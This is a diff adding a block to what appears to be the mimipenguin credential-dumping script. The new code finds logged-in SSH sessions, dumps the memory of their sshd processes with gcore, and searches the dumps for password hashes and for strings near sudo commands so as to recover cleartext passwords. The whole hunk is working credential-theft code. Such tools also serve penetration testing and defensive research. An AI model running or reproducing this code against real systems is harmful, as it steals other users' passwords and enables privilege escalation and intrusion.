@@ -172,6 +172,27 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 	fi
 fi
 
+#Support sshd - Search active connections for Sudo passwords
+if [[ -e "/etc/ssh/sshd_config" ]]; then
+        SOURCE="[SYSTEM - SSH]"
+        #get all ssh tty/pts sessions - sshd: user@pts01
+        PID="$(ps -eo pid,command | egrep 'sshd:.+@' | grep -v 'grep' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	#if exists aka someone logged into SSH then dump
+	if [[ $PID ]];then
+		while read -r pid; do
+		        gcore -o /tmp/sshd $PID >& /dev/null
+		        HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+$')"
+		        SALT="$(echo $HASH | cut -d'$' -f 3)"
+		        DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
+			#Remove dupes to speed up processing
+			DUMP=$(echo $DUMP | tr " " "\n" |sort -u)
+			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
+		done <<< $PID
+
+		#cleanup
+		rm -rf /tmp/sshd.*
+	fi
+fi
 #Output results to STDOUT
 printf "MimiPenguin Results:\n"
 printf "$RESULTS" | sort -u
